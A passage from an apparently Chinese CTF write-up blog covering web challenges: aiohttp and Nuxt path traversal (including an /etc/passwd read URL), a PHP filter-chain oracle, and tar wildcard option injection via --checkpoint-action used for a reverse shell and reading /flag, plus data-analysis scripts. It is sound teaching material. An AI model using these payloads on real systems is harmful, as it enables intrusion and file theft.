<span class="hljs-keyword">return</span> <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from_utf8_lossy</span>(output.stderr.<span class="hljs-title function_ invoke__">as_slice</span>()).<span class="hljs-title function_ invoke__">to_string</span>();<br>        &#125; <span class="hljs-keyword">else</span>&#123;<br>            fs::<span class="hljs-title function_ invoke__">remove_file</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));<br>            <span class="hljs-keyword">return</span> <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from_utf8_lossy</span>(output.stdout.<span class="hljs-title function_ invoke__">as_slice</span>()).<span class="hljs-title function_ invoke__">to_string</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">default</span>();<br><br>&#125;<br><br><span class="hljs-meta">#[launch]</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">rocket</span>() <span class="hljs-punctuation">-&gt;</span> _ &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">figment</span> = rocket::Config::<span class="hljs-title function_ invoke__">figment</span>()<br>        .<span class="hljs-title function_ invoke__">merge</span>((<span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;0.0.0.0&quot;</span>));<br>    rocket::<span class="hljs-title function_ invoke__">custom</span>(figment).<span class="hljs-title function_ invoke__">mount</span>(<span class="hljs-string">&quot;/&quot;</span>, routes![index,run_rust_code])<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409112043967.png" alt="image.png"><br>关键就在这里，通过报错读取flag<br>include!(“&#x2F;flag”)<br>即可</p><h1 id="掌控安全2024八月挑战赛"><a href="#掌控安全2024八月挑战赛" class="headerlink" title="掌控安全2024八月挑战赛"></a>掌控安全2024八月挑战赛</h1><h2 id="Just-A-Index"><a href="#Just-A-Index" class="headerlink" title="Just A Index"></a>Just A Index</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041219743.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041216537.png" alt="image.png"><br>打开网站就只有这段话加上个图片，加上题目介绍说所有题目均不需要目录扫描，猜测网站有别的信息泄漏，随便点点刷新下试试看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041218649.png" alt="image.png"><br>看到每个返回包里都有server，python3.10,aiohttp，我们搜下有什么洞<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041219755.png" alt="image.png"><br>目录遍历，加上题目说flag在&#x2F;flag，这个很有成功的可能性<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041223063.png" alt="image.png"><br>也就是说我们可以在静态文件所在目录进行目录遍历，想起刚才挠头的表情包，应该就是那里了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041224988.png" alt="image.png"></p><h2 id="web-php"><a href="#web-php" class="headerlink" title="web-php"></a>web-php</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041225213.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041318092.png" alt="image.png"><br>PHP Filter链——基于oracle的文件读取攻击<br>原理分析<br><a href="https://xz.aliyun.com/t/12939">https://xz.aliyun.com/t/12939</a><br>脚本<br><a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a><br>这题加了http验证<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041317014.png" alt="image.png"></p><h2 id="Nothing"><a href="#Nothing" class="headerlink" title="Nothing"></a>Nothing</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041320199.png" alt="image.png"><br>这里给了一些代码跟docker配置信息，只看网站的话就是个干净的前端网站<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041338649.png" alt="image.png"><br>可以看到docker是git clone了一个nuxt v3.0.0-rc.12<br>直接百度<br>看到了一个rce跟一个反射xss，反射xss八成用不上，rce版本又对不上，这里换微信搜索<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041344397.png" alt="image.png"><br>多出来个任意读取，根据给出的文件夹，我们直接复现<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041344890.png" alt="image.png"><br>Nuxt 是一种直观且可扩展的方式，可以使用 Vue 3 创建类安全、高性能和生产级的全栈 Web 应用程序和网站。<br>项目地址:<br><a href="https://github.com/nuxt/nuxt">https://github.com/nuxt/nuxt</a></p><p>payload:<br><a href="http://server/_nuxt/@fs/etc/passwd">http://server/_nuxt/@fs/etc/passwd</a></p><h2 id="压缩打包站"><a href="#压缩打包站" class="headerlink" title="压缩打包站"></a>压缩打包站</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041421637.png" alt="image.png"><br>这题也是给出了一定的源代码，打开网站看看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041425832.png" alt="image.png"><br>一个文件上传，一个文件下载<br>文件上传处的过滤，文件名不允许..跟&#x2F;，也不允许太大的文件<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041420908.png" alt="image.png"><br>文件下载<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041435670.png" alt="image.png"><br>这里可以看到，在tar命令后面使用了通配符<code>*</code>号，我们上传的文件名又可控，这里就会导致通配符注入，从而实现命令执行，这里我们可以选择反弹shell，也可以直接命令执行，读取flag<br>这里先试试反弹shell</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041609174.png" alt="image.png"><br>先上传一个非空文件<br>在上传–checkpoint&#x3D;1<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041610165.png" alt="image.png"><br>再通过base64，绕过过滤，进行命令执行getshell即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041611256.png" alt="image.png"><br>先记得nc一下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041612403.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041613998.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041613612.png" alt="image.png"><br>点击下载<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041614313.png" alt="image.png"><br>可以看到已经反弹成功<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041615990.png" alt="image.png"><br>完成</p><h3 id="命令执行读取"><a href="#命令执行读取" class="headerlink" title="命令执行读取"></a>命令执行读取</h3><p>回到一开始下载的源码，在dockerfile中写到<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041625371.png" alt="image.png"><br>flag就在根目录下&#x2F;flag开头后面跟着一些随机字符串的目录下，那我们只需要读取<code>/flag*</code>即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041626175.png" alt="image.png"><br>这个还是要先传个非空文件跟–checkpoint&#x3D;1，这里不重复了而已<br>然后就是download<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041627411.png" alt="image.png"><br>压缩包长这样，打开111.txt<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041627759.png" alt="image.png"><br>也是直接拿到flag</p><h3 id="原理（-tar-通配符漏洞"><a href="#原理（-tar-通配符漏洞" class="headerlink" title="原理（&#96;tar *通配符漏洞)"></a>原理（&#96;tar *通配符漏洞)</h3><p>如果目录中有以 <code>-</code>（连字符）开头的文件或目录名称，使用 <code>tar *</code> 时，<code>tar</code> 会误认为这些文件是选项，而不是文件名<br>举个例子：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041635566.png" alt="image.png"><br>在这个目录里，我们想打包’-e1.txt’跟’f1.txt’，但是tar将-e理解为这是某个参数或是选项，就像我们平时ls -la，他就把这个-e理解成类似于-la的东西，那我是可以通过–help打出help的，这里我们试试能不能成功<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041639199.png" alt="image.png"><br>可以看到我们明明是在打包东西，但是却输出了tar的help，这就是<code>tar *</code>的通配符漏洞<br>然后就是在tar中有两个特殊参数<br><code>--checkpoint</code>和<code>--checkpoint-action</code><br>其中<code>--checkpoint</code>可以理解为设置检查点，而<code>--checkpoint-action</code>就是在检查点执行操作<br><code>tar -cvf archive.tar --checkpoint=1 --checkpoint-action=echo=&quot;hello world&quot; *</code><br>这个命令的含义就是<br>每1个文件(或数据块)设置一个检查点，tar每处理100个文件，就执行echo输出hello world<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041646137.png" alt="image.png"><br>我们甚至可以命令执行<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409041646961.png" alt="image.png"></p><h2 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409050013171.png" alt="image.png"></p><p>先看看代码，还是很简单的<br>先判断URL格式，如果是url直接调用nuclei开扫，而且用的是他给出的0day模板扫，要扫出来有洞，就会返回flag<br>那我们下一步自然是看看0day模板<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409050021659.png" alt="image.png"><br>访问<code>/api/v1/version</code>跟<code>/api/v2/echo/?name=&lt;script&gt;alert(1111)&lt;/script&gt;&amp;file=/etc/p0sswd_95271834</code><br>其中<br>&#x2F;api&#x2F;v1&#x2F;version<br>是用来查看版本的<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409050022578.png" alt="image.png"><br>根据他给出的模板，要求版本在10.0.1到10.0.5之间<br>而且body还要包含”NAME”:”HACKER”和”msg”:”success”<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409050028556.png" alt="image.png"><br>至于&#x2F;api&#x2F;v2&#x2F;echo<br>他要找zkaq{[a-z]}，然后要包含<code>&lt;script&gt;alert(1111)&lt;/script&gt;</code>，还有就是状态码为200<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409050030199.png" alt="image.png"><br>到此，逻辑就很清楚了，写个小网站模拟下就好<br>api<br>-v1<br>–version<br>—index.html<br>-v2<br>–echo<br>—index.html<br>大体就长这样<br>v1的index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>version<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&quot;NAME&quot;:&quot;HACKER&quot;,&quot;msg&quot;:&quot;success&quot;,&quot;version&quot;:&quot;10.0.2&quot;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>v2</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>echo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>zkaq&#123;a&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1111)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用vps开个服务器<br>python3 -m http.server 9999<br>扫描即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409050045243.png" alt="image.png"></p><h1 id="2024羊城杯"><a href="#2024羊城杯" class="headerlink" title="2024羊城杯"></a>2024羊城杯</h1><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="data-analy1"><a href="#data-analy1" class="headerlink" title="data-analy1"></a>data-analy1</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121045392.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> re<br><br>regex_patterns = &#123;<br>    <span class="hljs-string">&quot;编号&quot;</span>: re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;^\d&#123;1,5&#125;$&quot;</span>),<br>    <span class="hljs-string">&quot;用户名&quot;</span>: re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;^(?!\d&#123;17&#125;[0-9X]$)(?![a-f0-9]&#123;32&#125;$)(?!\d+$)[a-zA-Z0-9]&#123;1,&#125;$&quot;</span>), <br>    <span class="hljs-string">&quot;密码&quot;</span>: re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;^[a-f0-9]&#123;32&#125;$&quot;</span>),<br>    <span class="hljs-string">&quot;姓名&quot;</span>: re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;^[\u4e00-\u9fa5]&#123;2,&#125;$&quot;</span>),<br>    <span class="hljs-string">&quot;性别&quot;</span>: re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;^(男|女)$&quot;</span>),<br>    <span class="hljs-string">&quot;出生日期&quot;</span>: re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;^\d&#123;8&#125;$&quot;</span>),<br>    <span class="hljs-string">&quot;身份证号&quot;</span>: re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;^\d&#123;17&#125;(\d|X)$&quot;</span>),<br>    <span class="hljs-string">&quot;手机号码&quot;</span>: re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;^\d&#123;11&#125;$&quot;</span>)<br>&#125;<br><br>input_file = <span class="hljs-string">&#x27;./1.csv&#x27;</span><br>output_file = <span class="hljs-string">&#x27;./2.csv&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8-sig&#x27;</span>) <span class="hljs-keyword">as</span> csvfile:<br>    reader = csv.reader(csvfile)<br>    rows = []<br>    <br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>        ordered_row = &#123;<br>            <span class="hljs-string">&quot;编号&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;用户名&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;密码&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;姓名&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;性别&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;出生日期&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;身份证号&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;手机号码&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>        &#125;<br>        <br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> row:<br>            <span class="hljs-keyword">for</span> key, pattern <span class="hljs-keyword">in</span> regex_patterns.items():<br>                <span class="hljs-keyword">if</span> pattern.<span class="hljs-keyword">match</span>(item):<br>                    ordered_row[key] = item<br>                    <span class="hljs-keyword">break</span><br><br>        rows.append(<span class="hljs-built_in">list</span>(ordered_row.values()))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;w&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8-sig&#x27;</span>) <span class="hljs-keyword">as</span> csvfile:<br>    writer = csv.writer(csvfile)<br>    writer.writerow([<span class="hljs-string">&quot;编号&quot;</span>, <span class="hljs-string">&quot;用户名&quot;</span>, <span class="hljs-string">&quot;密码&quot;</span>, <span class="hljs-string">&quot;姓名&quot;</span>, <span class="hljs-string">&quot;性别&quot;</span>, <span class="hljs-string">&quot;出生日期&quot;</span>, <span class="hljs-string">&quot;身份证号&quot;</span>, <span class="hljs-string">&quot;手机号码&quot;</span>])  <span class="hljs-comment"># 写入表头</span><br>    writer.writerows(rows)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据整理完毕，已输出到&quot;</span>, output_file)<br><br></code></pre></td></tr></table></figure><p>这个脚本有一点问题，会正则手机号码为姓名，但是也没关系，因为题目匹配度要求是&gt;95%,</p><h3 id="data-analy2"><a href="#data-analy2" class="headerlink" title="data-analy2"></a>data-analy2</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121045324.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121045371.png" alt="image.png"></p><p>一个流量包，翻看了以下带有敏感信息的都在 json 中，筛选一下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121045519.png" alt="image.png"></p><p>可以看到这里面的都是我们要的信息，原本这里的脚本调用 pyshark 会更容易，网上也有现成的脚本，但是我的 tshark 环境出了问题，一直报错，这里换了个思路，使用 ctf-neta 正则 username 这个关键词，再 ctrl+a,ctrl+c,ctrl+v 放到文本文档，写了个文本文档的分析<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121046225.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409121046482.png" alt="image.png"><br>我这里还手工删了一部分多余内容，方便我看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> json<br><br>input_txt = <span class="hljs-string">&#x27;1.txt&#x27;</span><br><br>output_csv = <span class="hljs-string">&#x27;output.csv&#x27;</span><br><br>json_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;&#123;&quot;username&quot;:\s*&quot;(.*?)&quot;,\s*&quot;name&quot;:\s*&quot;(.*?)&quot;,\s*&quot;sex&quot;:\s*&quot;(.*?)&quot;,\s*&quot;birth&quot;:\s*&quot;(.*?)&quot;,\s*&quot;idcard&quot;:\s*&quot;(.*?)&quot;,\s*&quot;phone&quot;:\s*&quot;(.*?)&quot;&#125;&#x27;</span>)<br><br>results = []<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_txt, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    content = file.read()<br><br>    matches = json_pattern.findall(content)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">in</span> matches:<br><br>        username = <span class="hljs-keyword">match</span>[<span class="hljs-number">0</span>]<br>        name = <span class="hljs-built_in">bytes</span>(<span class="hljs-keyword">match</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br>        sex = <span class="hljs-built_in">bytes</span>(<span class="hljs-keyword">match</span>[<span class="hljs-number">2</span>], <span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br>        birth = <span class="hljs-keyword">match</span>[<span class="hljs-number">3</span>]<br>        idcard = <span class="hljs-keyword">match</span>[<span class="hljs-number">4</span>]<br>        phone = <span class="hljs-keyword">match</span>[<span class="hljs-number">5</span>]<br>        <br>        <span class="hljs-comment"># 将解码后的内容添加到结果列表</span><br>        results.append([username, name, sex, birth, idcard, phone])<br><br><span class="hljs-comment"># 写入结果到CSV文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_csv, <span class="hljs-string">&#x27;w&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> csvfile:<br>    writer = csv.writer(csvfile)<br>    writer.writerow([<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;sex&quot;</span>, <span class="hljs-string">&quot;birth&quot;</span>, <span class="hljs-string">&quot;idcard&quot;</span>, <span class="hljs-string">&quot;phone&quot;</span>])  <span class="hljs-comment"># 写入表头</span><br>    writer.writerows(results)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;TXT文件整理完毕，已输出到&quot;</span>, output_csv)<br><br></code></pre></td></tr></table></figure><p>然后按照他给的规范进行筛选即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 校验用户名</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_username</span>(<span class="hljs-params">username</span>):<br>    <span class="hljs-keyword">return</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;^(?!\d+$)[A-Za-z0-9]&#123;1,&#125;$&quot;</span>, username) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 校验姓名</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_name</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;^[\u4e00-\u9fa5]&#123;2,&#125;$&quot;</span>, name) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 校验身份证号</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_idcard</span>(<span class="hljs-params">idcard</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(idcard) != <span class="hljs-number">18</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;^\d&#123;17&#125;[\dX]$&quot;</span>, idcard):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br>    coefficients = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    check_digit_table = [<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>]<br>    <br>    sum_of_products = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>(idcard[i]) * coefficients[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>))<br>    check_digit = check_digit_table[sum_of_products % <span class="hljs-number">11</span>]<br>    <br>    <span class="hljs-keyword">return</span> idcard[-<span class="hljs-number">1</span>] == check_digit<br><br><span class="hljs-comment"># 校验出生日期和身份证号中的出生日期</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_birth_and_idcard</span>(<span class="hljs-params">birth, idcard</span>):<br>    <span class="hljs-keyword">return</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;^\d&#123;8&#125;$&quot;</span>, birth) <span class="hljs-keyword">and</span> birth == idcard[<span class="hljs-number">6</span>:<span class="hljs-number">14</span>]<br><br><span 